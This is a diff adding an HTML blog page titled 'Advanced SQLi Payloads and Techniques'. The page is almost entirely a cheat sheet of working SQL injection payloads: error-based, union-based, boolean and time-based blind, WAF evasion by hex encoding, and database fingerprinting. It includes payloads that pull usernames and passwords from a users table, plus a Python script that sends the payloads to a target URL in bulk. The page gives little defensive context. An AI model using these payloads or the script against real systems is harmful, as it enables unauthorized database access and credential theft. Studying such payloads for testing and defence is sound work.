@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html lang="en-us"><head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">Advanced SQLi Payloads and Techniques | ByteShifters</title>
+<meta property="og:title" content="Advanced SQLi Payloads and Techniques | ByteShifters" />
+<meta name="twitter:title" content="Advanced SQLi Payloads and Techniques | ByteShifters" />
+<meta itemprop="name" content="Advanced SQLi Payloads and Techniques | ByteShifters" />
+<meta name="application-name" content="Advanced SQLi Payloads and Techniques | ByteShifters" />
+<meta property="og:site_name" content="" />
+
+<meta name="description" content="">
+<meta itemprop="description" content="" />
+<meta property="og:description" content="" />
+<meta name="twitter:description" content="" />
+
+<meta property="og:locale" content="en-us" />
+<meta name="language" content="en-us" />
+
+
+
+
+
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2024-10-03T00:00:00Z />
+    <meta property="article:published_time" content=2024-10-03T00:00:00Z />
+    <meta property="og:url" content="https://byteshifters.com/posts/hacking/sql-injections/advanced-sqli-payloads-techniques/" />
+
+    
+    <meta property="og:article:author" content="ByteShifters" />
+    <meta property="article:author" content="ByteShifters" />
+    <meta name="author" content="ByteShifters" />
+    
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "Advanced SQLi Payloads and Techniques",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2024-10-03",
+        "description": "",
+        "wordCount":  619 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2024-10-03",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "ByteShifters"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.122.0">
+
+    
+    <meta property="og:title" content="Advanced SQLi Payloads and Techniques" />
+<meta property="og:description" content="Error-Based SQL Injection Advanced Error Payloads &#39; AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) -- - Union-Based Injection Determining the Number of Columns &#39; UNION SELECT NULL, NULL, NULL, NULL -- Extracting Data &#39; UNION SELECT username, password, NULL, NULL FROM users -- Blind SQL Injection Boolean-Based Blind &#39; AND (SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END) -- Time-Based Blind &#39; AND IF(1=1, SLEEP(5), 0) -- Second-Order SQL Injection Injection in Profile Information Modify data stored in one place to affect queries executed elsewhere." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://byteshifters.com/posts/hacking/sql-injections/advanced-sqli-payloads-techniques/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-10-03T00:00:00+00:00" />
+<meta property="article:modified_time" content="2024-10-03T00:00:00+00:00" />
+
+
+
+    
+    <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Advanced SQLi Payloads and Techniques"/>
+<meta name="twitter:description" content="Error-Based SQL Injection Advanced Error Payloads &#39; AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) -- - Union-Based Injection Determining the Number of Columns &#39; UNION SELECT NULL, NULL, NULL, NULL -- Extracting Data &#39; UNION SELECT username, password, NULL, NULL FROM users -- Blind SQL Injection Boolean-Based Blind &#39; AND (SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END) -- Time-Based Blind &#39; AND IF(1=1, SLEEP(5), 0) -- Second-Order SQL Injection Injection in Profile Information Modify data stored in one place to affect queries executed elsewhere."/>
+
+
+    
+    <link rel="icon" type="image/png+xml" href="/icons/logo32.png">
+
+    <link rel="canonical" href="https://byteshifters.com/posts/hacking/sql-injections/advanced-sqli-payloads-techniques/">
+    <link href="/style.min.a65edcf99b5d9c11dd8dc9c13f2e80eec76933d8449c8579cefe3c64191b71d4.css" rel="stylesheet">
+    <link href="/code-highlight.min.3dea1c7a362e3a7df3392c75d19c1efa95b2e82aa030c322a07a6caf50cb8e9a.css" rel="stylesheet">
+
+    
+    <link rel="icon" type="image/png+xml" href="/icons/logo32.png">
+    
+    
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/logo32.png">
+    
+
+
+
+
+<link rel="manifest" href="https://byteshifters.com/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#cccccc">
+
+    
+    <link rel="icon" type="image/png"  sizes="32x32" href="/icons/logo32.png">
+
+</head>
+<body data-theme = "" class="notransition">
+
+<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="https://byteshifters.com/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title></title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/posts/">
+                        Posts
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/contact/">
+                        Contact
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">Advanced SQLi Payloads and Techniques</h1>
+                
+                
+                <div class="post-meta">
+                    <time datetime="2024-10-03T00:00:00&#43;00:00" itemprop="datePublished"> Oct 3, 2024 </time>
+                </div>
+                
+                
+                <div class="tags-list"><a href="https://byteshifters.com/tags/hacking/">#Hacking</a>
+                            <a href="https://byteshifters.com/tags/sqli/">#SQLi</a>
+                            </div>
+            </header>
+            
+    
+    <details class="toc" ZgotmplZ>
+        <summary><b></b></summary>
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#error-based-sql-injection">Error-Based SQL Injection</a>
+      <ul>
+        <li><a href="#advanced-error-payloads">Advanced Error Payloads</a></li>
+      </ul>
+    </li>
+    <li><a href="#union-based-injection">Union-Based Injection</a>
+      <ul>
+        <li><a href="#determining-the-number-of-columns">Determining the Number of Columns</a></li>
+        <li><a href="#extracting-data">Extracting Data</a></li>
+      </ul>
+    </li>
+    <li><a href="#blind-sql-injection">Blind SQL Injection</a>
+      <ul>
+        <li><a href="#boolean-based-blind">Boolean-Based Blind</a></li>
+        <li><a href="#time-based-blind">Time-Based Blind</a></li>
+      </ul>
+    </li>
+    <li><a href="#second-order-sql-injection">Second-Order SQL Injection</a>
+      <ul>
+        <li><a href="#injection-in-profile-information">Injection in Profile Information</a></li>
+      </ul>
+    </li>
+    <li><a href="#advanced-union-based-sql-injection">Advanced Union-Based SQL Injection</a>
+      <ul>
+        <li><a href="#union-based-error-handling">Union-Based Error Handling</a></li>
+        <li><a href="#union-with-hex-encoding">Union with Hex Encoding</a></li>
+        <li><a href="#multi-query-union-injection">Multi-Query Union Injection</a></li>
+        <li><a href="#union-based-cross-database-extraction">Union-Based Cross Database Extraction</a></li>
+      </ul>
+    </li>
+    <li><a href="#advanced-boolean-based-sql-injection">Advanced Boolean-Based SQL Injection</a>
+      <ul>
+        <li><a href="#time-based-boolean-injection-with-conditional-responses">Time-Based Boolean Injection with Conditional Responses</a></li>
+        <li><a href="#nested-boolean-injections">Nested Boolean Injections</a></li>
+        <li><a href="#error-based-boolean-injection">Error-Based Boolean Injection</a></li>
+        <li><a href="#using-bitwise-operations">Using Bitwise Operations</a></li>
+      </ul>
+    </li>
+    <li><a href="#combining-techniques">Combining Techniques</a>
+      <ul>
+        <li><a href="#example-union-with-time-based-injection">Example: Union with Time-Based Injection</a></li>
+        <li><a href="#example-nested-union-and-boolean-injection">Example: Nested Union and Boolean Injection</a></li>
+      </ul>
+    </li>
+    <li><a href="#automating-with-custom-scripts">Automating with Custom Scripts</a>
+      <ul>
+        <li><a href="#example-python-script-for-advanced-union-injection">Example: Python Script for Advanced Union Injection</a></li>
+      </ul>
+    </li>
+    <li><a href="#advanced-enumeration">Advanced Enumeration</a>
+      <ul>
+        <li><a href="#database-fingerprinting">Database Fingerprinting</a>
+          <ul>
+            <li><a href="#mysql">MySQL</a></li>
+            <li><a href="#postgresql">PostgreSQL</a></li>
+            <li><a href="#mssql">MSSQL</a></li>
+          </ul>
+        </li>
+        <li><a href="#column-enumeration">Column Enumeration</a></li>
+        <li><a href="#advanced-data-extraction">Advanced Data Extraction</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </details>
+            <div class="page-content">
+                <h2 id="error-based-sql-injection">Error-Based SQL Injection</h2>
+<h3 id="advanced-error-payloads">Advanced Error Payloads</h3>
+<pre tabindex="0"><code>&#39; AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) -- -
+</code></pre><h2 id="union-based-injection">Union-Based Injection</h2>
+<h3 id="determining-the-number-of-columns">Determining the Number of Columns</h3>
+<pre tabindex="0"><code>&#39; UNION SELECT NULL, NULL, NULL, NULL -- 
+</code></pre><h3 id="extracting-data">Extracting Data</h3>
+<pre tabindex="0"><code>&#39; UNION SELECT username, password, NULL, NULL FROM users -- 
+</code></pre><h2 id="blind-sql-injection">Blind SQL Injection</h2>
+<h3 id="boolean-based-blind">Boolean-Based Blind</h3>
+<pre tabindex="0"><code>&#39; AND (SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END) -- 
+</code></pre><h3 id="time-based-blind">Time-Based Blind</h3>
+<pre tabindex="0"><code>&#39; AND IF(1=1, SLEEP(5), 0) -- 
+</code></pre><h2 id="second-order-sql-injection">Second-Order SQL Injection</h2>
+<h3 id="injection-in-profile-information">Injection in Profile Information</h3>
+<p>Modify data stored in one place to affect queries executed elsewhere.</p>
+<h2 id="advanced-union-based-sql-injection">Advanced Union-Based SQL Injection</h2>
+<h3 id="union-based-error-handling">Union-Based Error Handling</h3>
+<p>Generate detailed error messages by crafting complex payloads:</p>
+<pre tabindex="0"><code>&#39; UNION SELECT 1, version(), database(), user() FROM dual WHERE 1=CAST((SELECT COUNT(*) FROM information_schema.tables) AS INT) --
+</code></pre><h3 id="union-with-hex-encoding">Union with Hex Encoding</h3>
+<p>Encode parts of your query to evade WAFs:</p>
+<pre tabindex="0"><code>&#39; UNION SELECT 1, 0x62656e6368, 0x70617373776f7264, user() --
+</code></pre><h3 id="multi-query-union-injection">Multi-Query Union Injection</h3>
+<p>Leverage multiple queries to extract more data:</p>
+<pre tabindex="0"><code>&#39; UNION SELECT 1, database(), (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()), user() --
+</code></pre><h3 id="union-based-cross-database-extraction">Union-Based Cross Database Extraction</h3>
+<p>Combine data from different databases (when supported):</p>
+<pre tabindex="0"><code>&#39; UNION SELECT 1, (SELECT column_name FROM db1.table1 LIMIT 1), (SELECT column_name FROM db2.table2 LIMIT 1), user() --
+</code></pre><h2 id="advanced-boolean-based-sql-injection">Advanced Boolean-Based SQL Injection</h2>
+<h3 id="time-based-boolean-injection-with-conditional-responses">Time-Based Boolean Injection with Conditional Responses</h3>
+<p>Use time delays to infer data based on conditional responses:</p>
+<pre tabindex="0"><code>&#39; AND IF((SELECT LENGTH(database()))&gt;5, SLEEP(5), 0) --
+</code></pre><h3 id="nested-boolean-injections">Nested Boolean Injections</h3>
+<p>Nest conditions to extract specific data:</p>
+<pre tabindex="0"><code>&#39; AND IF((SELECT SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1), 1, 1))=&#39;a&#39;, SLEEP(5), 0) --
+</code></pre><h3 id="error-based-boolean-injection">Error-Based Boolean Injection</h3>
+<p>Force errors conditionally to reveal information:</p>
+<pre tabindex="0"><code>&#39; AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())&gt;5, (SELECT table_name FROM information_schema.tables), 1) --
+</code></pre><h3 id="using-bitwise-operations">Using Bitwise Operations</h3>
+<p>Use bitwise operations for more obfuscation and complexity:</p>
+<pre tabindex="0"><code>&#39; AND IF((SELECT ASCII(SUBSTRING((SELECT database()),1,1))) &amp; 1, SLEEP(5), 0) --
+</code></pre><h2 id="combining-techniques">Combining Techniques</h2>
+<h3 id="example-union-with-time-based-injection">Example: Union with Time-Based Injection</h3>
+<p>Create a payload that uses both union and time-based injections:</p>
+<pre tabindex="0"><code>&#39; UNION SELECT IF((SELECT LENGTH(database()))&gt;5, SLEEP(5), 0), 1, user(), 4 --
+</code></pre><h3 id="example-nested-union-and-boolean-injection">Example: Nested Union and Boolean Injection</h3>
+<p>Combine nested boolean conditions with union-based data extraction:</p>
+<pre tabindex="0"><code>&#39; UNION SELECT 1, IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())&gt;5, (SELECT table_name FROM information_schema.tables LIMIT 1), 1), 3, 4 --
+</code></pre><h2 id="automating-with-custom-scripts">Automating with Custom Scripts</h2>
+<h3 id="example-python-script-for-advanced-union-injection">Example: Python Script for Advanced Union Injection</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://example.com/vulnerable.php&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payloads</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># Advanced Union-Based Injections</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#39; UNION SELECT 1, version(), database(), user() FROM dual WHERE 1=CAST((SELECT COUNT(*) FROM information_schema.tables) AS INT) -- &#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#39; UNION SELECT 1, 0x62656e6368, 0x70617373776f7264, user() -- &#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#39; UNION SELECT 1, database(), (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()), user() -- &#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#39; UNION SELECT 1, (SELECT column_name FROM db1.table1 LIMIT 1), (SELECT column_name FROM db2.table2 LIMIT 1), user() -- &#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># Advanced Boolean-Based Injections</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#39; AND IF((SELECT LENGTH(database()))&gt;5, SLEEP(5), 0) -- &#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#39; AND IF((SELECT SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1), 1, 1))=&#39;a&#39;, SLEEP(5), 0) -- &#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#39; AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())&gt;5, (SELECT table_name FROM information_schema.tables), 1) -- &#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#39; AND IF((SELECT ASCII(SUBSTRING((SELECT database()),1,1))) &amp; 1, SLEEP(5), 0) -- &#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># Combined Techniques</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#39; UNION SELECT IF((SELECT LENGTH(database()))&gt;5, SLEEP(5), 0), 1, user(), 4 -- &#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#39; UNION SELECT 1, IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())&gt;5, (SELECT table_name FROM information_schema.tables LIMIT 1), 1), 3, 4 -- &#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">payload</span> <span class="ow">in</span> <span class="n">payloads</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="n">payload</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Payload: </span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Response: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="si">}</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span></code></pre></div><h2 id="advanced-enumeration">Advanced Enumeration</h2>
+<h3 id="database-fingerprinting">Database Fingerprinting</h3>
+<h4 id="mysql">MySQL</h4>
+<pre tabindex="0"><code>&#39; OR 1=1 AND @@version -- 
+</code></pre><h4 id="postgresql">PostgreSQL</h4>
+<pre tabindex="0"><code>&#39; OR 1=1 AND version() -- 
+</code></pre><h4 id="mssql">MSSQL</h4>
+<pre tabindex="0"><code>&#39; OR 1=1 AND @@version -- 
+</code></pre><h3 id="column-enumeration">Column Enumeration</h3>
+<p>Determine the Number of Columns:</p>
+<pre tabindex="0"><code>&#39; ORDER BY 1 -- 
+&#39; ORDER BY 2 -- 
+</code></pre><p>Extract Column Names:</p>
+<pre tabindex="0"><code>&#39; UNION SELECT column_name FROM information_schema.columns WHERE table_name=&#39;users&#39; -- 
+</code></pre><h3 id="advanced-data-extraction">Advanced Data Extraction</h3>
+<p>Combine Multiple Rows into a Single Output:</p>
+<pre tabindex="0"><code>&#39; UNION SELECT GROUP_CONCAT(username, 0x3a, password) FROM users -- 
+</code></pre>
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="index.xml" target="_blank" rel="noopener noreferrer me"
+    title="Rss">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M4 11a9 9 0 0 1 9 9" />
+    <path d="M4 4a16 16 0 0 1 16 16" />
+    <circle cx="5" cy="19" r="1" />
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        
+        byteshifters.com
+        
+    </small>
+</footer><a href="#" title="" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+
+
+    
+    <script src="https://byteshifters.com/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>
+
+    
+
+</body>
+</html>
